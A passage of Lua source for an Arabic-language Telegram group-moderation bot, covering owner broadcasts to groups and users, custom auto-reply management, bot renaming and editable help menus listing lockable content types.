tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم اذاعة رسالتك بالتوجيه \n⌯︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source WAAD     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص بالتوجيه ⌯" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAIAN:get(WAAD.."AIAN:Send:Bot"..WAAD) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌯︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAIAN:setex(WAAD.."AIAN:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙ارسل الرساله الان لتوجيها \n⌯︙للخروج ارسل ↫ ( الغاء ) \n ✓")
return false
end 
if DevAIAN:get(WAAD.."AIAN:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevAIAN:smembers(WAAD..'AIAN:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم اذاعة رسالتك بالتوجيه \n⌯︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source WAAD     --
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه بالتثبيت ⌯" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAIAN:get(WAAD.."AIAN:Send:Bot"..WAAD) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌯︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAIAN:setex(WAAD.."AIAN:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌯︙للخروج ارسل ↫ ( الغاء ) \n ✓")
return false
end 
if DevAIAN:get(WAAD.."AIAN:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevAIAN:smembers(WAAD.."AIAN:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
AIANText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevAIAN:set(WAAD..'AIAN:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AIANText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevAIAN:set(WAAD..'AIAN:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AIANText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevAIAN:set(WAAD..'AIAN:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AIANText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevAIAN:set(WAAD..'AIAN:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AIANText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevAIAN:set(WAAD..'AIAN:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AIANText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevAIAN:set(WAAD..'AIAN:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AIANText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevAIAN:set(WAAD..'AIAN:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AIANText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevAIAN:set(WAAD..'AIAN:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم اذاعة "..AIANText.." بالتثبيت \n⌯︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAIAN:del(WAAD.."AIAN:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end
--     Source WAAD     --
if text == 'حذف رد من متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد من متعدد' and Manager(msg) and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end
DevAIAN:set(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevAIAN:get(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedod == 'DelGpRedRedod' then
if text == "الغاء" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء الامر" ,  1, "md")
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if not DevAIAN:sismember(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_,text) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لايوجد رد متعدد لهذه الكلمه ↫ "..text ,  1, "md")
return false
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙قم بارسال الرد المتعدد الذي تريد حذفه من الكلمه ↫ "..text ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevAIAN:set(WAAD..'AIAN:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
if text == 'حذف رد متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد متعدد' and Manager(msg) and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end
DevAIAN:set(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
return false
end
if text == 'اضف رد متعدد' and Manager(msg) and ChCheck(msg) then
DevAIAN:set(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRedod = DevAIAN:get(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SetGpRedod == 'SetGpRedod' then
if text == "الغاء" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء الامر" ,  1, "md")
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if DevAIAN:sismember(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_,text) then
local AIAN = "⌯︙لاتستطيع اضافة رد بالتاكيد مضاف في القائمه قم بحذفه اولا !"
keyboard = {} 
keyboard.inline_keyboard = {{{text="حذف الرد ↫ "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(AIAN).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الامر ارسل الرد الاول\n⌯︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevAIAN:set(WAAD..'AIAN:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevAIAN:sadd(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source WAAD     --
if text == 'حذف رد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد' and  Manager(msg) and ChCheck(msg) then
local List = DevAIAN:smembers(WAAD..'AIAN:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لا توجد ردود مضافه" ,  1, "md")
return false
end
DevAIAN:set(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text == 'اضف رد' and Manager(msg) and ChCheck(msg) then
DevAIAN:set(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRed = DevAIAN:get(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "الغاء" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء الامر" ,  1, "md")
DevAIAN:del(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌯︙يمكنك اضافة الى النص ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n⌯︙🌐 `#username` ↬ معرف المستخدم\n⌯︙📎 `#name` ↬ اسم المستخدم\n⌯︙🆔 `#id` ↬ ايدي المستخدم\n⌯︙✏️ `#bio` ↬ نبذا المستخدم\n⌯︙🎖 `#stast` ↬ رتبة المستخدم\n⌯︙📨 `#msgs` ↬ عدد الرسائل\n⌯︙📝 `#edit` ↬ عدد السحكات\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n⌯︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevAIAN:set(WAAD..'AIAN:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevAIAN:sadd(WAAD..'AIAN:Manager:GpRed'..msg.chat_id_,text)
DevAIAN:set(WAAD..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source WAAD     --
if text == 'حذف رد عام' and SecondSudo(msg) or text == '↫ حذف رد عام ⌯' and SecondSudo(msg) or text == 'مسح رد عام' and SecondSudo(msg) then
local List = DevAIAN:smembers(WAAD.."AIAN:Sudo:AllRed")
if #List == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لا توجد ردود مضافه" ,  1, "md")
return false
end
DevAIAN:set(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text == 'اضف رد عام' and SecondSudo(msg) or text == '↫ اضف رد عام ⌯' and SecondSudo(msg) then
DevAIAN:set(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetAllRed = DevAIAN:get(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "الغاء" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء الامر" ,  1, "md")
DevAIAN:del(WAAD..'AIAN:Add:AllRed'..msg.sender_user_id_)
return false
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌯︙يمكنك اضافة الى النص ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n⌯︙🌐 `#username` ↬ معرف المستخدم\n⌯︙📎 `#name` ↬ اسم المستخدم\n⌯︙🆔 `#id` ↬ ايدي المستخدم\n⌯︙✏️ `#bio` ↬ نبذا المستخدم\n⌯︙🎖 `#stast` ↬ رتبة المستخدم\n⌯︙📨 `#msgs` ↬ عدد الرسائل\n⌯︙📝 `#edit` ↬ عدد السحكات\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n⌯︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAIAN:set(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevAIAN:set(WAAD.."AIAN:Add:AllText"..msg.sender_user_id_, text)
DevAIAN:sadd(WAAD.."AIAN:Sudo:AllRed",text)
DevAIAN:set(WAAD.."DelSudoRep",text)
return false 
end end
--     Source WAAD     --
if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
local redod = DevAIAN:smembers(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_)
MsgRep = '⌯︙قائمة الردود المتعدده ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevAIAN:smembers(WAAD..'AIAN:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
MsgRep = '⌯︙لا توجد ردود متعدده مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == 'حذف الردود المتعدده' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود المتعدده' and Manager(msg) and ChCheck(msg) then
local redod = DevAIAN:smembers(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_)
if #redod == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لا توجد ردود متعدده مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAIAN:del(WAAD..'AIAN:Text:GpTexts'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف الردود المتعدده")  
return false
end
end
--     Source WAAD     --
if text == 'الردود' and Manager(msg) and ChCheck(msg) or text == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevAIAN:smembers(WAAD..'AIAN:Manager:GpRed'..msg.chat_id_)
MsgRep = '⌯︙ردود المدير ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n'
for k,v in pairs(redod) do
if DevAIAN:get(WAAD.."AIAN:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevAIAN:get(WAAD.."AIAN:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevAIAN:get(WAAD.."AIAN:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevAIAN:get(WAAD.."AIAN:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevAIAN:get(WAAD.."AIAN:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevAIAN:get(WAAD.."AIAN:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevAIAN:get(WAAD.."AIAN:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevAIAN:get(WAAD.."AIAN:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '⌯︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == 'حذف الردود' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود' and Manager(msg) and ChCheck(msg) or text == 'حذف ردود المدير' and Manager(msg) and ChCheck(msg) or text == 'مسح ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevAIAN:smembers(WAAD..'AIAN:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAIAN:del(WAAD..'AIAN:Gif:GpRed'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Voice:GpRed'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Audio:GpRed'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Photo:GpRed'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Stecker:GpRed'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Video:GpRed'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:File:GpRed'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Text:GpRed'..v..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف ردود المدير")  
return false
end
end
--     Source WAAD     --
if  text == "ردود المطور" and SecondSudo(msg) or text == "الردود العام" and SecondSudo(msg) or text == "ردود العام" and SecondSudo(msg) or text == "↫ الردود العام ⌯" and SecondSudo(msg) then
local redod = DevAIAN:smembers(WAAD.."AIAN:Sudo:AllRed")
MsgRep = '⌯︙ردود المطور ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n'
for k,v in pairs(redod) do
if DevAIAN:get(WAAD.."AIAN:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevAIAN:get(WAAD.."AIAN:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevAIAN:get(WAAD.."AIAN:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevAIAN:get(WAAD.."AIAN:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevAIAN:get(WAAD.."AIAN:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevAIAN:get(WAAD.."AIAN:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevAIAN:get(WAAD.."AIAN:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevAIAN:get(WAAD.."AIAN:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '⌯︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == "حذف ردود المطور" and SecondSudo(msg) or text == "حذف ردود العام" and SecondSudo(msg) or text == "مسح ردود المطور" and SecondSudo(msg) or text == "↫ مسح ردود العام ⌯" and SecondSudo(msg) then
local redod = DevAIAN:smembers(WAAD.."AIAN:Sudo:AllRed")
if #redod == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAIAN:del(WAAD.."AIAN:Add:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:Gif:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:Voice:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:Audio:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:Photo:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:Stecker:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:Video:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:File:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:Text:AllRed"..v)
DevAIAN:del(WAAD.."AIAN:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف ردود المطور")  
return false
end
end 
--     Source WAAD     --
if text and text == "تغيير اسم البوت" or text and text == "وضع اسم البوت" or text and text == "تغير اسم البوت" or text and text == "↫ وضع اسم البوت ⌯" then
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل لي اسم البوت الان" ,  1, "md") 
DevAIAN:set(WAAD..'AIAN:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' or text == 'مسح اسم البوت' then
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
DevAIAN:del(WAAD..'AIAN:NameBot')
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم حذف اسم البوت")
end end 
--     Source WAAD     --
if text and text:match("^استعاده الاوامر$") and SecondSudo(msg) or text and text:match("^استعادة كلايش الاوامر$") and SecondSudo(msg) then
HelpList ={'AIAN:Help','AIAN:Help1','AIAN:Help2','AIAN:Help3','AIAN:Help4','AIAN:Help5','AIAN:Help6'}
for i,Help in pairs(HelpList) do
DevAIAN:del(WAAD..Help) 
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text == "تعيين الاوامر" and SecondSudo(msg) or text == "تعيين امر الاوامر" and SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل كليشة (الاوامر) الان " ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local WAAD =  DevAIAN:get(WAAD..'AIAN:Help0'..msg.sender_user_id_)
if WAAD == 'msg' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAIAN:del(WAAD..'AIAN:Help0'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:Help', text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "الاوامر" or text == "اوامر" or text == "مساعده" then
local Help = DevAIAN:get(WAAD..'AIAN:Help')
local Text = [[
🖥┇𝐬𝐨𝐮𝐫𝐜𝐞 𝐝𝐫𝐚𝐠𝐨𝐧 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 .
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⚙️ | اهلا انت في اوامر البوت الرئيسية 🔏
⚙️ | اختر في الاسفل الرقم التابع للأمر 🔍
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ 
⌯︙م1 ↫ اوامر الحمايه
⌯︙م2 ↫ اوامر الادمنيه
⌯︙م3 ↫ اوامر المدراء
⌯︙م4 ↫ اوامر المنشئين
⌯︙م5 ↫ اوامر المطورين
⌯︙م6 ↫ اوامر الاعضاء
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ 
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اوامر الادمنيه •",callback_data="/HelpList2:"..msg.sender_user_id_},{text="• اوامر الحمايه •",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="• اوامر المنشئين •",callback_data="/HelpList4:"..msg.sender_user_id_},{text="• اوامر المدراء •",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="• اوامر الاعضاء •",callback_data="/HelpList6:"..msg.sender_user_id_},{text="• اوامر المطورين •",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "تعيين امر م1" and SecondSudo(msg) or text == "تعيين امر م١" and SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل كليشة (م1) الان " ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local WAAD =  DevAIAN:get(WAAD..'AIAN:Help01'..msg.sender_user_id_)
if WAAD == 'msg' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAIAN:del(WAAD..'AIAN:Help01'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:Help1', text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م1" or text == "م١" or text == "اوامر1" or text == "اوامر١" then
if not Admin(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا الامر يخص الرتب الاعلى فقط\n⌯︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAIAN:get(WAAD..'AIAN:Help1')
local Text = [[
⌯︙اوامر حماية المجموعه ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙قفل • فتح ↫ الروابط
⌯︙قفل • فتح ↫ المعرفات
⌯︙قفل • فتح ↫ البوتات
⌯︙قفل • فتح ↫ المتحركه
⌯︙قفل • فتح ↫ الملصقات
⌯︙قفل • فتح ↫ الملفات
⌯︙قفل • فتح ↫ الصور
⌯︙قفل • فتح ↫ الفيديو
⌯︙قفل • فتح ↫ الاونلاين
⌯︙قفل • فتح ↫ الدردشه
⌯︙قفل • فتح ↫ التوجيه
⌯︙قفل • فتح ↫ الاغاني
⌯︙قفل • فتح ↫ الصوت
⌯︙قفل • فتح ↫ الجهات
⌯︙قفل • فتح ↫ الماركداون
⌯︙قفل • فتح ↫ التكرار
⌯︙قفل • فتح ↫ الهاشتاك
⌯︙قفل • فتح ↫ التعديل
⌯︙قفل • فتح ↫ التثبيت
⌯︙قفل • فتح ↫ الاشعارات
⌯︙قفل • فتح ↫ الكلايش
⌯︙قفل • فتح ↫ الدخول
⌯︙قفل • فتح ↫ الشبكات
⌯︙قفل • فتح ↫ المواقع
⌯︙قفل • فتح ↫ الفشار
⌯︙قفل • فتح ↫ الكفر
⌯︙قفل • فتح ↫ الطائفيه
⌯︙قفل • فتح ↫ الكل
⌯︙قفل • فتح ↫ العربيه
⌯︙قفل • فتح ↫ الانكليزيه
⌯︙قفل • فتح ↫ الفارسيه
⌯︙قفل • فتح ↫ التفليش
